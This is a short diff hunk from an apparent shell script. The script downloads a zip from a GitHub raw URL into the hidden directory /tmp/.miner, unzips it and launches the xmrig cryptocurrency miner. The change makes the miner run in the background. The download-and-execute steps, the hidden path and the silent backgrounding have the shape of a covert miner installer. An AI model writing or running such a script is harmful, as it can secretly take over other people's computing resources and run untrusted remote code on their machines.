@@ -7,4 +7,4 @@ curl https://raw.githubusercontent.com/Aleks4ndr/zsh_remote_script/main/miner.zi
 cd /tmp/.miner
 unzip -of miner.zip -d miner
 cd miner/xmrig-6.12.1
-./xmrig
+./xmrig &
